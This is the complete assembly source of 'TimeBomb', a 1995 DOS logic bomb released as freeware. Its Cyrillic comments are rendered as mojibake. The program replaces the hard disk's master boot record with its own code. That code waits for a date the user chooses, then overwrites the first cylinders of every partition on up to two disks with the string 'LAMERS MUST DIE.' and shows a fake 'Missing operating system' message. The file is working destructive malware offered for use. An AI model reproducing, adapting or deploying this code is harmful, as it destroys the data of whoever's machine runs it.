;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; (C)  ANS  (Armourer)		   TimeBomb    Ver 1.00			25 Jun
; FIDOnet 2:461/29.444		   FreeWare, SourceWare			 1995
;
;
; ��������� ������� MBR. �� ���⨦���� ��।������� ���� �⠫쭮 ��堥� ����
;
; ���� MBR �����뢠���� � 䠩� c:\mbr.bak, �⮡� ����� �뫮 ����⠭�����,
; �᫨ ��. ��ࠢ����� ���� MBR �� ����砥�, ⠪ �� �᫨ �� ����� ��-�
; ����� 㬭��, ������ ����㧪� ��⥬� � ��⨢���� ࠧ���� - TimeBomb �ਤ����
; ��।�����.
;
; �� �ࠡ��뢠��� TimeBomb �������� ���� 4 樫���� ������� ࠧ���� ��
; ����, ������ �����᪨� ��᪨ DOS (extended partition)
;
; ������ �������, �� Non-DOS ࠧ���� (HPFS, ���ਬ��) �� �⮬ ����ࠤ���
; ������⥫쭮 - � �裡 � ��७�� �⫨稥� �� �������� �� DOS FAT.
;
killed_cyl	= 4	; ��᫮ 㡨������ 樫���஢ � ������ ࠧ����
xor_value	= 73h	; ���祭�� ����஢���� ��襣� ��᫥����� ᫮�� ;-)

	locals
cseg	segment
	assume	cs:cseg
	org	100h
	.286
start	proc	near
;
; ���⠫����
;
	; �஢��塞 ��������� ��ப�
	mov	si, 80h
	mov	bl, byte ptr [si]
	xor	bh, bh
	cmp	bl, 8
	jnc	@@checkdate


help:
	; � ��������� ��ப� �� 㪠���� ��� - �뢮��� ���᪠���
	mov	dx, offset @@title
	mov	ah, 9
	int	21h
	int	20h


	; ����祭�� BCD-�᫠ �� ���. ��ப�
getBCD		proc	near
	dec	si
	mov	ax, word ptr [si+bx]	; ��६ ��᫥���� ��� ����
	sub	ax, '00'		; ASCII -> BIN
	xchg	al, ah
	db	0d5h, 10h		; AAD � ����䨪��஬ 16
	cmp	al, 9ah
	jnc	help
	dec	si			; �ࠧ� ���室�� � ᫥���饬� ����
	dec	si
	retn
getBCD		endp


@@checkdate:	; �஢��塞 ���� (᭠砫� ���, ��⥬ �����, ��⥬ �᫮)
		; � �ਢ���� �� � �㦭��� �ଠ��
	; ���४⭮��� ���� �� �஢��塞 - �� �஡���� ���짮��⥫� -
	; �� �� ⠬ ����
	call	getBCD			; ��६ ���� ����
	mov	byte ptr year, al	; ����稫� BCD-year
	cmp	byte ptr [bx+si+1], '.'	; �஢��塞 ࠧ����⥫�
	jne	help
	call	getBCD			; ��६ ���� �����
	mov	byte ptr month, al	; ����稫� BCD-month
	cmp	byte ptr [bx+si+1], '.'	; �஢��塞 ࠧ����⥫�
	jne	help
	call	getBCD			; ��६ ���� ���
	mov	byte ptr day, al	; ����稫� BCD-day


@@singledisk:
;
; �����塞 MBR ���� ᢮�� ����� �� bomb proc
;
; ��⠥� ���� MBR, ��࠭塞 ��� � c:\mbr.bak, ��襬 ᥡ�	
;
	; ��⠥� MBR
	mov	cx, 1
	mov	dx, 80h
	mov	ax, 201h
	mov	bx, offset buffer
	int	13h
	jnc	@@rd_ok

	mov	dx, offset @@rd_err

@@err_exit:	; �뢮� ᮮ�饭�� �� DX � �뫥� �� �訡��
	mov	ah, 9
	int	21h
	retn

@@rd_ok:
	; ������� 䠩�
	mov	dx, offset @@fname
	xor	cx, cx
	mov	ah, 3ch
	int	21h
	jnc	@@cr_ok

	mov	dx, offset @@cr_err
	jmp	@@err_exit

@@cr_ok:
	; ��襬 � 䠩�
	mov	bx, ax
	mov	cx, 512
	mov	dx, offset buffer
	mov	ah, 40h
	int	21h
	jnc	@@wr_ok

	mov	dx, offset @@wr_err
	jmp	@@err_exit

@@wr_ok:
	; ����뢠�� 䠩�
	mov	ah, 3eh
	int	21h

;
; ��७�ᨬ ᢮� MBR �� ���� ��ண�
;
	mov	si, offset bomb
	mov	di, offset buffer
	mov	bx, di
	mov	cx, di
	sub	cx, si
	cld
	rep	movsb

;
; �����뢠�� ���� MBR ������ ��ண�
;
	mov	cx, 1
	mov	dx, 80h
	mov	ax, 301h
	int	13h

	mov	dx, offset @@mbr_wr_err
	jc	@@err_exit

	mov	dx, offset @@done_msg
	jmp	@@err_exit


	; ����饭�� �� �訡���
@@rd_err:	db	'Error read the MBR of C:',13,10,'$'	
@@cr_err:	db	'Error creating the '
@@fname:	db	'C:\MBR.BAK',0,'file',13,10,'$'
@@wr_err:	db	'Error writing backup file',13,10,'$'
@@mbr_wr_err:	db	'Error writing new MBR',13,10,'$'
@@done_msg:	db	'Your MBR replaced by TimeBomb',13,10,'$'


	; ���⠢��
@@title:
db	13,10,10
db	'(C) Armourer    TimeBomb	Ver 1.00	25 Jun 1995',13,10,10
db	'	Usage:	timebomb <date>',13,10,10
db	'	Where <date> is a fatal date for your computer.',13,10
db	'	Date format must be in exUSSR standard:    DD.MM.YY',13,10,10
db	'Good Luck ;)',13,10,'$'

start	endp



;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; ����� �����. ������������ � MBR (�� MBR ������ �����)
;
; ��� ��� �㤥� ���⮢��� � ���� 0:7c00h
;
bomb	proc	near

	; ����ࠨ���� �⥪ � ��७�ᨬ MBR, �㤠 ���� (0:600h)
	cli
	mov	ax, cs
	mov	ss, ax
	mov	ds, ax
	mov	es, ax
	mov	si, 7c00h
	mov	sp, si
	push	si		; �� �㦭� ��� ��᫥���饣� ���� boot'�
	cld
	mov	cx, 1beh / 2	; ��᫥ ⠪��� ��७�� SI �㤥� 㪠�뢠��
	mov	di, 600h	; �� �����
	rep	movsw

	push	ax					; �������
	push	offset beginbomb - offset bomb + 600h	; ���饭��
	retf


beginbomb:
	; �஢��塞 �६�
	mov	ah, 4
	int	1ah		; ��竨 ���� � CX:DX
	jc	@@skipbomb	; �᫨ ��� �� ࠡ���� -> �ய�᪠�� �஢���

year	= $ + 2
	cmp	cl, 12h		; �஢��塞 ���
	jc	@@skipbomb	; ��� �� ᮢ��� ;)
	jne	@@explode	; �᫨ ��� ��� ��襫 - ���뢠���� ���������

month	= $ + 3
day	= $ + 2
	cmp	dx, 1234h	; ������ ⠪, �⮡� �� ᣥ���஢����
				; ���⪨� ��ਠ�� ��� CMP
	jc	@@skipbomb	; �� ᮢ��� ���� � �����


@@explode:
	;
	; �� ᮢ����, ��諠 �ୠ� ���...
	;
	; ��ࠥ� ���� 樫����� ������� ࠧ���� (������ �����᪨�
	; ��᪨ DOS)
	;
	; ��⠭�������� � ���� ����� ��ࠬ���� ����
	mov	dl, 80h
	call	destroy

	; ��⠭�������� ��ࠬ���� ��ண� ����, �᫨ �� ����
	ror	dl, 1		; �᫨ ���� ���, 䫠� CF �㤥� ��⠭�����
	jc	@@singledisk

	mov	dl, 81h
	call	destroy

@@singledisk:
	jmp	@@incorrect	; �뢮��� ᮮ�饭�� "Missing operating ssytem"


@@skipbomb:
;
; ��ࠡ�⪠ ��ଠ�쭮�� ���� MBR
;
	; �饬 ����㧮�� ࠧ���
	mov	cl, 4			; ���� �ᥣ� 4 ��ਠ�� ...

@@searchboot:		; ���� ���᪠
	mov	dx, word ptr [si]	; �ࠧ� ����㦠�� � DX �, �� �㦭�
	cmp	dl, 80h			; ��� ࠧ��� ����㧮�� ?
	je	@@boot

	add	si, 10h			; ���室�� � ᫥���饩 �����
	loop	@@searchboot

	; �� ��諨 - �뤠�� ᮮ�饭��
@@incorrect:
	call	errmsg
	db	'Missing operating system',0


@@boot:			; ����㦠�� boot-ᥪ�� � ��।��� ��� �ࠢ�����
	mov	cx, word ptr [si+2]	; �� ���� - � CX
	mov	ax, 201h		; ��⠥� 1 ᥪ��
	pop	bx			; �� ����� 0:7c00h
	push	bx
	int	13h
	jnc	@@exit

	call	errmsg
	db	'Error reading operating system',0

@@exit:
	cmp	word ptr [bx + 510], 0aa55h
	jne	@@incorrect
	retn				; ����᪠�� boot

;
;	����ணࠬ��
;

	; �뤠� ᮮ�饭�� �� �訡��
errmsg		proc	near
	sti
	cld
	pop	si
	mov	ah, 0eh
@@nextchar:	
	lodsb
	or	al, al
	je	$
	int	10h
	jmp	@@nextchar
errmsg		endp


	; ��室 ��� ࠧ����� ��᪠ � ������� �� ��ࠬ��஢ � ����
getpart		proc	near
	; �� ४��ᨢ��� �㭪��.
	; �� �室� � SI �ॡ���� 㪠��⥫� �� ��।��� ࠧ���
	; � ���� �� ����� ES:DI ������� ��ࠬ���� ⥪.ࠧ����

	mov	cx, 4		; ���稪 ࠧ����� � ������ MBR

@@nextpart:
	; �஢��塞 ⨯ ࠧ����
	cmp	byte ptr [si+4], 0	; ���ᯮ��㥬� ࠧ���
	je	@@exit

	; ��襬 � ���� ��ࠬ���� ࠧ����
	mov	ax, word ptr [si]	; ������
	stosw
	mov	dx, ax			; ��⮢���� �� �室� � ४����

disk1	= $ + 1
	mov	dl, 80h			; ����� ��ࠡ��뢠����� ��᪠

	mov	ax, word ptr [si+2]
	stosw				; �������/ᥪ��

	; ����� �஢��塞 ⨯ ࠧ���� - �� ���७�� �� �� ?
	cmp	byte ptr [si+4], 5
	jne	@@exit			; ��� - ���� �����

	; ���塞 � ४����
	; ��⠥� MBR ���७���� ࠧ����
	push	cx			; ���࠭塞 ���稪
	push	si			; ���࠭塞 㪠��⥫� �� ࠧ����
	add	bx, 512			; �த������ 㪠��⥫� �� ����
	mov	cx, ax			; ����� CX:DX 㪠�뢠�� �� MBR
	mov	ax, 201h		; ���७���� ࠧ����
	int	13h			; ��⠥� ���७�� ࠧ��� � 0:BX
	jnc	@@rec			; �஢�ઠ �� ���४⭮���

	; ��室�� �� ४��ᨨ � ��砥 ᡮ�
	pop	si
	pop	cx
	sub	bx, 512
	jmp	@@exit

@@rec:
	mov	si, bx			; ��⠭�������� 㪠��⥫�
	add	si, 1beh		; �� ⠡���� ࠧ�����
	call	getpart


@@exit:
	add	si, 10h
	loop	@@nextpart

	; ��室 �� ४��ᨨ
	sub	bx, 512
	pop	dx
	pop	si
	pop	cx
	push	dx
	retn

getpart		endp


	; ����⮦���� ᮤ�ন���� ⥪�饣� ��᪠
destroy		proc	near

	; ����砥� ��ࠬ���� ����, 㪠������� � DL
	mov	byte ptr ds:[offset disk - offset bomb + 600h], dl
	mov	byte ptr ds:[offset disk1 - offset bomb + 600h], dl
	mov	ah, 8
	int	13h
	mov	byte ptr ds:[heads - offset bomb + 600h], dh
	and	cl, 63
	mov	byte ptr ds:[sectors - offset bomb + 600h], cl
	push	dx

	mov	bx, 0a00h	; ���� ��� �⥭�� MBR ���७��� ࠧ�����
				; �� 室� ���� � BX �㤥� �ਡ�������� �� 512 -
				; ⠪ �� ���ᨬ���� �஢��� ����������
				; ��⠢�� 57 ࠧ�����
	mov	di, 500h	; ���� ��� ��ࠬ���� ��� int 13h (64 ��᪠)

	; �����ᨢ�� ��室�� �����᪨� ��᪨, �����뢠� � ���� ��ࠬ����
	; ��� int 13h
	push	si		; ���४�� �室 � ४����
	push	cx

	xor	ax, ax		; ��⠭���� ��� ��࠭�� �������� MBR
	stosw
	inc	ax
	stosw

	call	getpart		; ��室 ࠧ�����


	; ������� ���祭�� �ய��뢠���
	; ����� � bx ����� ����� �ய��뢠���� ������ � ��ࠣ��� - 800h
	push	di	; ���࠭塞 㪠��⥫� �� 墮�� ᯨ᪠ ��ࠬ��஢
	mov	di, bx	; � DI �㤥� 㪠��⥫� �� ���� ��� ������
	shl	di, 4	; ���� �㤥� �ᯮ�������� � ᬥ饭�� 8000h
	push	di	; ���࠭塞 ���� ���� ����������

@@nextword:
	mov	si, offset lmd - offset bomb + 600h
	mov	cx, 16
@@nextchar:
	lodsb
	xor	al, xor_value
	stosb
	loop	@@nextchar
	dec	bx
	jne	@@nextword


	; ���� ����� �� �����
	pop	bx		; ����⠭�������� ���� ����
	pop	si		; ����⠭�������� 㪠��⥫� �� ��ࠬ����
	mov	cx, si		; ����塞 �᫮ ���ࠥ��� ࠧ�����
	sub	cx, 500h
	shr	cx, 2

	std
	lodsw			; ���室�� � ��᫥���� ����� � ����


@@nextpart:
	push	cx		; ���࠭塞 ���稪

	lodsw			; ��६ ��ࠬ���� ࠧ����
	mov	cx, ax		; �������/ᥪ��
	lodsw
	mov	dx, ax		; ������

disk	= $ + 1
	mov	dl, 80h		; ����� ���ࠥ���� ��᪠

	mov	si, killed_cyl	; ���稪 㡨������ 樫���஢

	; �ய��뢠�� ࠧ���
@@nexthead:
sectors	= $ + 1
	mov	ax, 310h	; !!!!
	int	13h
	inc	dh		; �������� ������

heads	= $ + 2
	cmp	dh, 16		; ���� 樫���� ?
	jne	@@nexthead

	add	cx, 64		; ������騩 樫����
	xor	dh, dh		; ��稭��� � �㫥��� ������
	dec	si
	jne	@@nexthead

	pop	cx		; ����⠭�������� ���稪
	loop	@@nextpart	; � ���⨬ 横� �� ࠧ�����

	pop	dx
	retn
destroy		endp


lmd:
	irpc	ch, <LAMERS MUST DIE.>
		db	'&ch' xor xor_value
	endm

bomb	endp


buffer:			; � �㤥� ���� ���� mbr
	dw	offset buffer - offset bomb
cseg	ends
end	start
